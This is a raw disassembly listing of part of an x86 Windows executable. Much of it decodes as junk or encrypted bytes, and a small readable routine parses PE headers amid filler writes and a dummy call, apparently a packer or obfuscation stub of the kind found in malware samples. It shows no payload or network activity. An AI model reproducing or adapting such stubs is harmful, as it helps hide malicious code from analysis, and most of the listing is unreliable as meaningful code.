  4113cc:	inc    ebx
  4113cd:	ror    ebp,1
  4113cf:	adc    DWORD PTR ds:0x44b087af,edx
  4113d5:	(bad)  
  4113d6:	xchg   ebx,eax
  4113d7:	lock jl 0x4113f7
  4113da:	daa    
  4113db:	cwde   
  4113dc:	(bad)  
  4113dd:	push   esp
  4113df:	popf   
  4113e0:	nop
  4113e1:	fnsave [eax-0x80]
  4113e4:	bound  ecx,QWORD PTR [edi+esi*4+0x4658aa4]
  4113eb:	iret   
  4113ec:	mov    eax,0x689244d8
  4113f1:	in     eax,dx
  4113f2:	mov    bh,0xd4
  4113f4:	int    0xcb
  4113f6:	mov    dl,0xb4
  4113f8:	das    
  4113f9:	cdq    
  4113fa:	mov    ah,BYTE PTR [edx]
  4113fc:	cmp    eax,0x8e186b0e
  411401:	jne    0x41144e
  411403:	xchg   ecx,eax
  411404:	shl    esi,0xa0
  411407:	es jecxz 0x411433
  41140a:	inc    edx
  41140b:	leave  
  41140c:	out    dx,al
  41140d:	push   esp
  41140e:	retf   0xe5a3
  411411:	outs   dx,DWORD PTR ds:[esi]
  411412:	pop    edx
  411413:	repz dec edi
  411415:	adc    dl,BYTE PTR [ebx]
  411417:	iret   
  411418:	and    eax,0xa55c0750
  41141d:	push   ss
  41141e:	push   esp
  41141f:	mov    cl,0xfc
  411421:	jge    0x411420
  411423:	retf   0xf8d
  411426:	sub    al,0x75
  411428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411429:	stc    
  41142a:	cmp    BYTE PTR [eax],dh
  41142c:	repz js 0x411444
  41142f:	push   esi
  411430:	lock mov ds:0x2fc21b5c,eax
  411436:	ins    BYTE PTR es:[edi],dx
  411437:	imul   esi,DWORD PTR [ebp-0x134c1a22],0x300c7b6a
  411441:	mov    edi,0x93c5c986
  411446:	ja     0x41146d
  411448:	adc    eax,0xdf8df46e
  41144d:	ss jmp 0x41149b
  411450:	adc    al,0x1e
  411452:	les    ebx,FWORD PTR [esp+edi*1-0x69564011]
  411459:	retf   0x834a
  41145c:	call   0xc55ec962
  411461:	test   al,0xb1
  411463:	iret   
  411464:	mov    bl,0x3a
  411466:	inc    ebx
  411467:	add    dl,0x66
  41146a:	mov    esi,0x6c423210
  41146f:	sub    eax,DWORD PTR [ebp+ecx*8-0xc]
  411473:	mov    dh,0xb4
  411475:	dec    edx
  411476:	in     al,0x63
  411478:	push   cs
  411479:	and    ecx,esi
  41147b:	les    edi,FWORD PTR [ebx-0x65c9f5bb]
  411481:	(bad)  
  411482:	call   0x674bee77
  411487:	xchg   esi,eax
  411488:	or     al,0xe9
  41148a:	dec    eax
  41148b:	jmp    0xbe01197
  411490:	out    dx,al
  411491:	out    dx,al
  411492:	jbe    0x41145c
  411494:	push   edi
  411495:	xor    ebx,DWORD PTR [eax+0x29]
  411498:	nop
  411499:	fdiv   st,st(6)
  41149b:	sbb    DWORD PTR [edx+0x2a],edx
  41149e:	mov    ah,0xd0
  4114a0:	sbb    eax,0x5b9a0926
  4114a5:	(bad)  
  4114a6:	sub    BYTE PTR cs:[ecx],al
  4114a9:	and    eax,0x6adf0211
  4114ae:	ret    
  4114af:	fistp  QWORD PTR [ebp+0x7354b680]
  4114b5:	push   ss
  4114b6:	jp     0x4114eb
  4114b8:	jmp    0x33b9:0xac77a59f
  4114bf:	jp     0x411450
  4114c1:	push   edi
  4114c2:	test   BYTE PTR ds:0x4cbc23f5,bl
  4114c8:	les    esi,FWORD PTR [ebp-0x6ab207be]
  4114ce:	push   0xffffff80
  4114d0:	dec    esp
  4114d1:	jo     0x411512
  4114d3:	aaa    
  4114d4:	inc    esi
  4114d5:	sbb    DWORD PTR [ebx],0x40f455f0
  4114db:	mov    al,0xd7
  4114dd:	jl     0x41148a
  4114df:	int3   
  4114e0:	or     BYTE PTR [edi-0x4f],ch
  4114e3:	frstor ds:0xfda115f7
  4114e9:	adc    DWORD PTR [ecx],ebp
  4114eb:	push   ebx
  4114ec:	outs   dx,DWORD PTR ds:[esi]
  4114ed:	mov    al,0x21
  4114ef:	cwde   
  4114f0:	ficom  DWORD PTR [esi+0x36b49157]
  4114f6:	jle    0x411517
  4114f8:	sahf   
  4114f9:	aad    0x86
  4114fb:	fnstcw WORD PTR [esi]
  4114fd:	adc    edi,DWORD PTR [esi-0x709cc120]
  411503:	dec    ebx
  411504:	into   
  411505:	enter  0x245b,0xf6
  411509:	sbb    DWORD PTR [ecx+ecx*4-0xe],0xeb0fd3b2
  411511:	test   al,0xd2
  411513:	inc    edi
  411514:	jnp    0x4114f0
  411516:	scas   al,BYTE PTR es:[edi]
  411517:	pop    esp
  411518:	test   BYTE PTR [edi-0x3d],al
  41151b:	mov    cl,0xb7
  41151d:	shr    DWORD PTR [ecx],1
  41151f:	test   al,0x5c
  411521:	ds mov bl,0x89
  411524:	clc    
  411525:	cmp    BYTE PTR [esi],al
  411527:	push   0xffffffd0
  411529:	(bad)  
  41152a:	xor    ah,BYTE PTR [ecx-0x6e6368fe]
  411530:	add    ebx,0xfffffffb
  411533:	(bad)  
  411535:	mov    ah,0xd6
  411537:	inc    ebx
  411538:	jno    0x4115a7
  41153a:	fwait
  41153b:	popa   
  41153c:	xor    ebx,DWORD PTR [ebx+ebp*2-0x52]
  411540:	mov    edi,0x73df5201
  411545:	ror    ebx,cl
  411547:	push   eax
  411548:	xchg   ebx,eax
  411549:	loop   0x411516
  41154b:	or     esi,DWORD PTR [edx+0x76]
  41154e:	fidiv  WORD PTR [ecx+0x51]
  411551:	xchg   edx,eax
  411552:	imul   edx,DWORD PTR [edi-0x75],0xfffffff3
  411556:	mov    ds:0xa2297d5f,eax
  41155b:	in     eax,0xab
  41155d:	lahf   
  41155e:	mov    dl,0x79
  411560:	sbb    ah,bh
  411562:	push   0x7ea4c4cd
  411567:	out    dx,al
  411568:	xchg   DWORD PTR [ebx-0xfc5e38b],ebx
  41156e:	mov    ds:0x93e18e5d,al
  411573:	scas   al,BYTE PTR es:[edi]
  411574:	outs   dx,DWORD PTR ds:[esi]
  411575:	adc    al,0x43
  411577:	push   cs
  411578:	mov    esp,0xe0d5cf60
  41157d:	ficom  WORD PTR [edi+0x437abb62]
  411583:	sub    ebp,DWORD PTR [esi+0x38]
  411586:	rcl    BYTE PTR [ebx],0xf9
  411589:	dec    eax
  41158a:	fistp  WORD PTR [esi]
  41158c:	aam    0x6a
  41158e:	stc    
  41158f:	iret   
  411590:	pop    ecx
  411591:	push   es
  411592:	xor    esp,DWORD PTR [edx+0x2a69baad]
  411598:	xchg   DWORD PTR [edx+0x74],ebx
  41159b:	repnz outs dx,BYTE PTR ds:[esi]
  41159d:	sbb    edx,ecx
  41159f:	mov    cl,0x96
  4115a1:	test   DWORD PTR [ecx+0x3f],esi
  4115a4:	adc    cl,ch
  4115a6:	push   0x59efeef4
  4115ab:	in     eax,0x5d
  4115ad:	cmp    BYTE PTR [edi],ah
  4115af:	sub    BYTE PTR [esi-0x67364ec9],bl
  4115b5:	xor    DWORD PTR [edi],ecx
  4115b7:	dec    edi
  4115b8:	enter  0x2da1,0x41
  4115bc:	xor    eax,0xd6147c57
  4115c1:	setg   ah
  4115c4:	cwde   
  4115c5:	std    
  4115c6:	mov    edx,0xe701dea9
  4115cb:	iret   
  4115cc:	pop    ds
  4115cd:	xchg   ebp,eax
  4115ce:	hlt    
  4115cf:	repnz cld 
  4115d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115d2:	push   esi
  4115d3:	or     DWORD PTR [ebx-0x3eccf7ab],ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	push   edx
  411619:	sahf   
  41161a:	in     al,dx
  41161b:	test   DWORD PTR [esi-0x5b8181c0],0xaa7e7e7f
  411625:	fs mov dl,0x29
  411628:	mov    dl,0xa0
  41162a:	test   DWORD PTR [esi+0x23b783e9],ebx
  411630:	pop    ecx
  411631:	jnp    0x4115b7
  411633:	dec    ebp
  411634:	lock ins BYTE PTR es:[edi],dx
  411636:	pop    esp
  411637:	arpl   WORD PTR [edi],dx
  411639:	mov    DWORD PTR [edi+esi*2+0x9],edi
  41163d:	call   0x9835f519
  411642:	jo     0x411618
  411644:	sub    al,0xe0
  411646:	retf   0x2fb1
  411649:	mov    eax,edi
  41164b:	idiv   BYTE PTR [edx+0x43]
  41164e:	xchg   ebx,eax
  41164f:	aaa    
  411650:	jmp    DWORD PTR [ebx+0x41]
  411653:	std    
  411654:	sbb    eax,0xe1fbada5
  411659:	loopne 0x4116bd
  41165b:	sbb    BYTE PTR [edx+0x72b7648e],dl
  411661:	push   ebx
  411662:	ja     0x4115ec
  411664:	add    eax,0xd8bf7290
  411669:	push   ebx
  41166a:	lock xor BYTE PTR [esi-0x5b],bh
  41166e:	fwait
  41166f:	push   0xffffffb1
  411671:	(bad)  
  411672:	lods   al,BYTE PTR ds:[esi]
  411673:	aad    0xb4
  411675:	enter  0xc88b,0x55
  411679:	push   esi
  41167a:	pop    ecx
  41167b:	ss jbe 0x411680
  41167e:	mov    eax,ds:0x80926c60
  411683:	jmp    0x411693
  411685:	mov    esi,0x907967aa
  41168a:	mov    dh,0x45
  41168c:	mov    DWORD PTR [edi-0x3589d4c0],ebx
  411692:	inc    edx
  411693:	sahf   
  411694:	inc    eax
  411695:	add    DWORD PTR [edi],ebp
  411697:	and    dl,ah
  411699:	imul   edi,DWORD PTR [esi-0x65],0x44
  41169d:	sub    BYTE PTR es:[ebx+0x496164df],dh
  4116a4:	ror    BYTE PTR [ebx],cl
  4116a6:	mov    al,ds:0x153b6d4
  4116ab:	jns    0x4116fe
  4116ad:	ja     0x41163d
  4116af:	xchg   edi,eax
  4116b0:	or     al,0xac
  4116b2:	mov    esp,0x5347426
  4116b7:	fwait
  4116b8:	scas   eax,DWORD PTR es:[edi]
  4116b9:	add    BYTE PTR [eax+0x79a8f824],bh
  4116bf:	xchg   bl,dl
  4116c1:	out    dx,al
  4116c2:	in     al,dx
  4116c3:	jge    0x411735
  4116c5:	dec    ecx
  4116c6:	test   BYTE PTR [eax+0x35dad6ac],0x60
  4116cd:	inc    DWORD PTR [eax]
  4116cf:	xor    al,0xca
  4116d1:	cld    
  4116d2:	ficom  DWORD PTR [ecx]
  4116d4:	(bad)
  4116d7:	pop    esp
  4116d8:	push   0x23
  4116da:	and    bl,BYTE PTR [ecx+0x6d596ee5]
  4116e0:	pop    esp
  4116e1:	icebp  
  4116e2:	idiv   BYTE PTR [eax]
  4116e4:	repz push 0x5e
  4116e7:	imul   esi
  4116e9:	xchg   ebp,eax
  4116ea:	retf   
  4116eb:	mov    ds,WORD PTR [ebx]
  4116ed:	push   0xffffffc0
  4116ef:	out    0x39,al
  4116f1:	jl     0x4116b2
  4116f3:	ja     0x4116b9
  4116f5:	mov    ch,0xd4
  4116f7:	dec    ecx
  4116f8:	pop    esi
  4116f9:	push   cs
  4116fa:	fsubr  QWORD PTR [esi-0x4665bacf]
  411700:	mov    al,0x44
  411702:	lods   eax,DWORD PTR ds:[esi]
  411703:	lock sbb edi,DWORD PTR [esp+ebp*4-0x11913d3b]
  41170b:	pop    ebp
  41170c:	lods   al,BYTE PTR ds:[esi]
  41170d:	ret    0xd293
  411710:	fdivr  QWORD PTR [esi+0x17]
  411713:	push   eax
  411714:	lea    esi,[esi+0x12e801bc]
  41171a:	lock lods al,BYTE PTR ds:[esi]
  41171c:	adc    al,0x59
  41171e:	loopne 0x411720
  411720:	aaa    
  411721:	pusha  
  411722:	out    0x49,eax
  411724:	ins    DWORD PTR es:[edi],dx
  411725:	arpl   WORD PTR [ecx+0x2c],sp
  411728:	pusha  
  411729:	popf   
  41172a:	xchg   DWORD PTR [edx-0x75],esp
  41172d:	loopne 0x41175b
  41172f:	shl    ch,cl
  411731:	repz pop es
  411733:	fimul  DWORD PTR [esi-0xecbd74]
  411739:	jb     0x41174e
  41173b:	loop   0x41176a
  41173d:	mov    ds:0xc2925086,al
  411742:	pop    ebx
  411743:	fs push ds
  411745:	inc    cl
  411747:	sbb    BYTE PTR [ebx+0x77],cl
  41174a:	mov    ds:0x11bc49e5,eax
  41174f:	xor    DWORD PTR [ecx+edx*2-0x57f3633c],eax
  411756:	push   esp
  411757:	in     al,0x13
  411759:	push   0xcd76324e
  41175e:	cmp    DWORD PTR [esi],esi
  411760:	sub    edi,esi
  411762:	(bad)  
  411763:	dec    ebp
  411764:	mov    ds:0xc7f45298,al
  411769:	ficomp WORD PTR [ebx]
  41176b:	cmp    ch,BYTE PTR [ecx+0x36]
  41176e:	aam    0x2d
  411770:	inc    ebx
  411771:	sbb    eax,0xedbcb81f
  411776:	icebp  
  411777:	mov    cl,0x13
  411779:	clc    
  41177a:	repnz call 0x4259:0xd385ca03
  411782:	cli    
  411783:	inc    edx
  411784:	mov    dh,0x54
  411786:	bound  edi,QWORD PTR [edi-0x7f4853c0]
  41178c:	xchg   esi,eax
  41178d:	xchg   DWORD PTR [edx+ecx*2+0x40],eax
  411791:	(bad)  
  411793:	and    BYTE PTR [esi],bh
  411795:	test   ebp,ecx
  411797:	push   eax
  411798:	pop    ds
  411799:	jo     0x411798
  41179b:	popf   
  41179c:	xchg   esp,eax
  41179d:	and    eax,0xf5953cd4
  4117a2:	xchg   BYTE PTR [eax*4-0x13fcc5e1],ch
  4117a9:	adc    dh,dl
  4117ab:	jmp    0xb7e2:0x1d9b50bb
  4117b2:	jb     0x4117ec
  4117b4:	xor    DWORD PTR [ebx+eiz*8],edi
  4117b7:	cmp    ebp,DWORD PTR [ecx+0x794a7a18]
  4117bd:	push   edi
  4117be:	mov    ebp,0xe5e8cdb6
  4117c3:	(bad)  
  4117c5:	and    eax,0x2d73d8cb
  4117ca:	enter  0x3a47,0x49
  4117ce:	mov    eax,DWORD PTR [ebp+0x8]
  4117d1:	mov    DWORD PTR ds:0x4336a3,0x423d
  4117db:	mov    al,BYTE PTR [eax]
  4117dd:	sub    DWORD PTR ds:0x4335ff,0x6d7d
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43369f,0x433603
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43369f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43361b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x4336ab,0x0
  41182f:	mov    eax,ds:0x4336ab
  411834:	inc    eax
  411835:	mov    ds:0x4336ab,eax
  41183a:	cmp    DWORD PTR ds:0x4336ab,0xb
  411841:	jne    0x411887
  411847:	push   0x4337bc
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x4336ab,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x4336ab
  411899:	inc    eax
  41189a:	mov    ds:0x4336ab,eax
  41189f:	cmp    DWORD PTR ds:0x4336ab,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	cmp    eax,0x2ca4f649
  4118ec:	dec    esi
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x411879
  4118f4:	jbe    0x4118c6
  4118f6:	repnz out 0x88,al
  4118f9:	jne    0x4118b0
  4118fb:	push   cs
  4118fc:	xchg   edx,eax
  4118fd:	jb     0x41194e
  4118ff:	and    al,0xf1
  411901:	imul   eax,DWORD PTR [edx+0x44da3c4a],0xf1b7cad6
  41190b:	lock push cs
  41190d:	xchg   esp,eax
  41190e:	scas   al,BYTE PTR es:[edi]
  41190f:	int3   
  411910:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411911:	jp     0x4118ca
  411913:	scas   eax,DWORD PTR es:[edi]
  411914:	and    eax,0x5d1a8b19
  411919:	and    BYTE PTR [ebx+0x57],dl
  41191c:	sub    DWORD PTR [eax-0x49673450],0x7711f531
  411926:	xor    eax,0x69ff6ba3
  41192b:	inc    esi
  41192c:	push   eax
  41192d:	add    eax,0x95a58847
  411932:	or     edi,DWORD PTR ds:[ebx]
  411935:	xor    eax,DWORD PTR [edi]
  411937:	dec    ebx
  411938:	ins    BYTE PTR es:[edi],dx
  411939:	(bad)  
  41193b:	mov    ds:0x420dda90,al
  411940:	pop    ds
  411941:	sub    eax,0x2b0a72a5
  411946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411947:	icebp  
  411948:	(bad)  
  411949:	shl    DWORD PTR [eax+0x25b11bd0],cl
  41194f:	jmp    0x8ec17a85
  411954:	pushf  
  411955:	lock test edi,ebx
  411958:	(bad)  
  411959:	push   ds
  41195a:	push   cs
  41195b:	popf   
  41195c:	mov    eax,0x6b9c4a76
  411961:	ds jge 0x4119db
  411964:	jb     0x411904
  411966:	test   al,0x58
  411968:	test   BYTE PTR [esi],0x3
  41196b:	pusha  
  41196c:	out    0x8e,eax
  41196e:	(bad)  
  41196f:	adc    BYTE PTR [esi-0x22],bl
  411972:	push   ss
  411973:	pop    eax
  411974:	add    edi,DWORD PTR [ebx-0x11]
  411977:	inc    ebp
  411978:	add    BYTE PTR [ebp+0x12],ch
  41197b:	(bad)  
  41197c:	xchg   edi,eax
  41197d:	fs or  al,ah
  411980:	imul   eax,DWORD PTR [edi-0x741b0952],0xffffffd1
  411987:	test   DWORD PTR [esi-0x74],eax
  41198a:	int    0x8f
  41198c:	mov    fs:0x21152f75,al
  411992:	(bad)  
  411993:	mov    ds:0x14cd07fe,eax
  411998:	rcr    BYTE PTR [edi],1
  41199a:	in     al,0xa7
  41199c:	cmp    eax,0x5c8a9ed5
  4119a1:	test   eax,0x2c7979e8
  4119a6:	fwait
  4119a7:	aam    0x3d
  4119a9:	adc    eax,0x8acca82f
  4119ae:	mov    eax,0xf5c212d6
  4119b3:	xchg   ebp,eax
  4119b4:	ja     0x4119bd
  4119b6:	add    cl,dl
  4119b8:	jne    0x4119e2
  4119ba:	xchg   esi,eax
  4119bb:	dec    esi
  4119bc:	jno    0x411940
  4119be:	loope  0x4119e5
  4119c0:	add    ecx,DWORD PTR [ebp+0xa]
  4119c3:	and    dh,BYTE PTR [ebp-0x44]
  4119c6:	rcr    ebp,0x63
  4119c9:	aam    0x3f
  4119cb:	or     dh,ch
  4119cd:	ins    BYTE PTR es:[edi],dx
  4119ce:	(bad)  
  4119cf:	jae    0x411971
  4119d1:	cmp    dh,bl
  4119d3:	cs cli 
  4119d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119d7:	xchg   edx,eax
  4119d8:	iret   
  4119d9:	xchg   ebp,eax
  4119da:	xchg   eax,ebp
  4119dc:	and    BYTE PTR [edi],ch
  4119de:	or     eax,0x78b7608b
  4119e3:	mov    ax,gs:0xda72f58b
  4119ea:	aam    0x38
  4119ec:	mov    ah,BYTE PTR [edi-0x6]
  4119ef:	adc    ch,dl
  4119f1:	outs   dx,BYTE PTR ds:[esi]
  4119f2:	sbb    DWORD PTR fs:[ecx+0x45],esp
  4119f6:	push   ebp
  4119f7:	add    eax,DWORD PTR [ebx+0x77ae9ce7]
  4119fd:	inc    ecx
  4119fe:	push   ebx
  4119ff:	dec    BYTE PTR [edi+0x1f]
  411a02:	mov    ah,0x8f
  411a04:	xlat   BYTE PTR ds:[ebx]
  411a05:	push   0x959963
  411a0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a0b:	push   ebp
  411a0c:	jo     0x411a67
  411a0e:	scas   al,BYTE PTR es:[edi]
  411a0f:	cmp    BYTE PTR [edx],al
  411a11:	aad    0xed
  411a13:	mov    ch,0x88
  411a15:	iret   
  411a16:	mov    ecx,0x16d47441
  411a1b:	mov    edx,0xda4136bf
  411a20:	mov    ebp,0xed550c72
  411a25:	sbb    dh,BYTE PTR [esi+0x3aeaed44]
  411a2b:	iret   
  411a2c:	cld    
  411a2d:	and    ch,ah
  411a2f:	fild   DWORD PTR [ecx+edx*8+0x18]
  411a33:	adc    DWORD PTR [esi-0x66],edx
  411a36:	imul   edi,DWORD PTR [ebp-0x77],0xffffffa6
  411a3a:	outs   dx,BYTE PTR ds:[esi]
  411a3b:	inc    edi
  411a3c:	je     0x411a3e
  411a3e:	cmp    BYTE PTR [ecx],al
  411a40:	pop    eax
  411a41:	jne    0x411a81
  411a43:	fwait
  411a44:	stos   DWORD PTR es:[edi],eax
  411a45:	xor    eax,0xc3a268f5
  411a4a:	outs   dx,BYTE PTR ds:[esi]
  411a4b:	push   0xf33ce67e
  411a50:	into   
  411a51:	aam    0x62
  411a53:	mov    WORD PTR [eax+0x29ee0fae],?
  411a59:	retf   
  411a5a:	test   al,0xc2
  411a5c:	(bad)  
  411a5d:	cld    
  411a5e:	pusha  
  411a5f:	xchg   ebp,eax
  411a60:	jg     0x411ac2
  411a62:	imul   ebx,DWORD PTR ds:0x36d2d9fc,0x4450679
  411a6c:	dec    ecx
  411a6d:	retf   0x89f2
  411a70:	retf   0x6c63
  411a73:	cmp    ebx,DWORD PTR [edx+edx*4+0x62]
  411a77:	dec    esi
  411a78:	push   edi
  411a79:	cmc    
  411a7a:	mov    ebp,0xc975eb0a
  411a7f:	call   0x36bf:0x2e22d30
  411a86:	jmp    0xd68c:0x9fb3e928
  411a8d:	cli    
  411a8e:	push   0xb257a5
  411a93:	mov    dl,0xe4
  411a95:	add    DWORD PTR [ecx+0x2694bece],ebx
  411a9b:	sub    DWORD PTR [ebx+eax*1],edx
  411a9e:	shr    ecx,0xd
  411aa1:	add    BYTE PTR [eax],al
  411aa3:	add    BYTE PTR [ebx+0x5435fc45],cl
  411aa9:	or     BYTE PTR [ecx+0x7],dl
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
